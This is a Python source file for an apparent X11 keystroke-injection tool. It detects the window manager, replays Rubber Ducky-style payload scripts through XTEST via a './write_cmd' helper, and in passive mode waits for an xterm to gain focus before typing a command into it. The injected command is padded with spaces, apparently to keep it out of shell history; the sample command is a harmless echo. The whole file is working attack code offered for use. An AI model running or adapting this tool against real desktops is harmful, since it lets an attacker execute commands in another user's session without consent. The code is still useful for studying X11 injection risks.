#!/usr/bin/env python3

import time
import os
import subprocess
import argparse
import re
import sys
import glob

from Xlib.display import Display
from Xlib import X, XK

class VBG(object):
    def __init__(self):
        self.display = Display()
        self.term_windows = []
        self.term_strings = ("xterm")
        self.cmd = " "*5 + ";{};exit;".format("echo w00t w00t")
        self.default_delay = 0.05
        self.control_key_map = {
                "ESC": XK.XK_Escape,
                "ALT": XK.XK_Alt_L,
                "WINDOWS": XK.XK_Super_L,
                "ENTER": XK.XK_Return,
                "CONTROL": XK.XK_Control_L,
                "DOLLAR": XK.XK_dollar,
                "SHIFT": XK.XK_Shift_L,
                "F2": XK.XK_F2
                }
        self.map = {}
        for keysym in range(0, 65535):
            symbol = self.display.lookup_string(keysym)
            if symbol != None:
                self.map[symbol] = keysym

        if args.mode == "cmd":
            if not "XTEST" in self.display.list_extensions():
                print("[E] - XTEST Extension Not Supported. Maybe Connect With `ssh -Y`.", file=sys.stderr)
                sys.exit(2)
            elif not args.passive and args.payload:
                    self.injectWMCmd(args.payload)
                    sys.exit(0)
            elif not args.passive:
                wm = self.detectEnvironment()
                if wm:
                    payloads = glob.glob("payloads/{}_payload*".format(wm.split()[0].lower()))
                    if not payloads:
                        print("[E] No Suitable Payload Found.")
                        sys.exit(1)
                    for wm_payload in payloads:
                        self.injectWMCmd(wm_payload)
                    sys.exit(0)
                else:
                    print("[-] - Falling Back to Passive Mode.")
            print("[+] - Trying Passive Mode.")
            self.findTerms(self.display, self.display.screen().root)
            self.waitFocusAndInjectCmd(self.term_strings)
        else:
            print("[E] - Unsupported Mode.")
            sys.exit(1)

    def detectEnvironment(self):
        print("[+] - Detecting Window Manager.")
        cmd = "wmctrl -m"
        output = subprocess.check_output(cmd.split()).splitlines()
        wm = output[0].decode("ascii").split(" ", maxsplit=1)[1]
        if not wm:
            print("[-] - Could Not Detect Environment. Check if wmctrl is Installed.")
            return None
        wm = wm.strip()
        print("[+] - Window Manager {} Detected.".format(wm.strip()))
        return wm

    def injectWMCmd(self, payload_file):
        print("[+] - Running Payload from File {}.".format(payload_file))
        f = open(payload_file, "r")
        payload = self.parseDuck(f)
        for p in payload:
            if type(p) == float:
                time.sleep(p)
                continue
            bytes_payload = " ".join([str(x) for x in p]).encode("ascii")
            proc = subprocess.Popen(
                    ["./write_cmd"],
                    stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE)
            print(proc.communicate(input=bytes_payload)[0].decode("ascii"))
            time.sleep(self.default_delay)
        #os.system("./write_cmd '{}'".format(self.cmd))


    def mapKey(self, key):
        if key in self.control_key_map:
            return self.control_key_map[key]

        keysym = XK.string_to_keysym(key)
        if keysym != 0:
            return keysym

        return self.map.get(key, None)


    def parseDuck(self, script):
        payload = []
        for line in script:
            line = line.strip("\n")
            split_line = line.split(" ", maxsplit=1)
            instr = split_line[0]
            if instr == "STRING":
                arg = split_line[1]
                keycodes = []
                for ch in arg:
                    keysym = self.mapKey(ch)
                    if not keysym:
                        print("[E] - Parse Error. Character \"{}\" has no Valid Keysym.".format(ch))
                        sys.exit(1)
                    #print("{} -> kc:{} ksym:{}".format(ch, self.display.keysym_to_keycode(keysym), keysym))
                    keycodes.append(self.display.keysym_to_keycode(keysym))
                    keycodes.append(self.display.keysym_to_keycode(keysym))
                payload.append(keycodes)

            elif "-" in instr:
                keycodes = []
                key = instr.split("-")
                if len(key) != 2:
                    print("[E] - Parse Error. \"{}\" Composition Length is Unsupported (max 2 keys).".format(instr))
                    sys.exit(1)

                keycode1, keycode2 = tuple(map(self.display.keysym_to_keycode, map(self.mapKey, key)))
                if keycode1 and keycode2:
                    keycodes.append(keycode1)
                    keycodes.append(keycode2)
                    keycodes.append(keycode2)
                    keycodes.append(keycode1)
                else:
                    print("[E] - Parse Error. \"{}\" Unsupported Composition.".format(instr))
                    sys.exit(1)
                payload.append(keycodes)

            elif instr in self.control_key_map:
                keycode = self.display.keysym_to_keycode(self.control_key_map[instr])
                payload.append([keycode])

            elif instr == "REM":
                continue
            elif instr == "DELAY":
                arg = split_line[1]
                try:
                    delay = float(arg)
                except:
                    print("[E] - Parse Error. \"{}\" is not a Valid Delay.".format(arg))
                    sys.exit(1)
                payload.append(delay)
            elif instr == "REPEAT":
                arg = split_line[1]
                try:
                    repetitions = int(arg)
                except:
                    print("[E] - Parse Error. \"{}\" is not a Valid Number of Repetitions.".format(arg))
                    sys.exit(1)
                payload.append(payload[-1]*repetitions)
            else:
                print("[E] - Parse Error. \"{}\" is not a Supported Instruction.".format(instr))
                sys.exit(1)
        return payload

    def findTerms(self, display, window):
        children = window.query_tree().children
        win_class = window.get_wm_class()
        win_name = window.get_wm_name()

        if win_class != None and win_class[0] in "".join(self.term_strings):
            #if "root@" in win_name:
            self.term_windows.append(window)

        for w in children:
            self.findTerms(self.display, w)

    def waitFocusAndInjectCmd(self, term_strings):
        print("[+] - Waiting Focus on a Terminal Window...")
        while True:
            focused_window = self.display.get_input_focus().focus
            focused_window_name = focused_window.get_wm_name()
            focused_window_class = focused_window.get_wm_class()
            if focused_window_class == None:
                continue

            if focused_window_class[0] in "".join(term_strings):
                if re.match("[a-zA-Z]+[a-zA-Z0-9]*", focused_window_name):
                    os.system("./write_cmd '{}'".format(self.cmd))
                    break
            time.sleep(self.default_delay)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    required = parser.add_argument_group('required arguments')
    required.add_argument("-m",
            "--mode",
            metavar="cmd, keylog",
            help="Execution mode",
            required=True)
    parser.add_argument("--passive",
            help="Wait for Terminal",
            required=False)
    parser.add_argument("-p",
            "--payload",
            metavar="payload_gnome.ducky",
            help="Duck Script Payload",
            required=False)
    args = parser.parse_args()
    VBG()
